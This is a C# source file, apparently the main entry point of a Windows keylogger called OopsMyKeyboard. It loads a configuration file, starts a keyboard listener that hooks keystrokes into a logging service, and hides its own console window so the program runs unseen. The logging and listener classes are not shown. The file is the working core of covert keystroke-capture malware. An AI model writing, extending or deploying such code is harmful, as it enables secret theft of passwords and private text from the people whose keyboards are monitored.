using OopsMyKeyboard.Service;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace OopsMyKeyboard
{
    class OopsMyKeyboard
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public static void Main()
        {

            string path = Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), @"cfg.json");
            var cfg = new ConfigurationService(path).Load();
            var logService = new LogService(cfg);

            var listener = new KeyboardListener(logService);
            listener.Listen();

            ShowWindow(GetConsoleWindow(), 0);

            Application.Run();

            listener.UnhookWindowsHook();
        }
    }
}
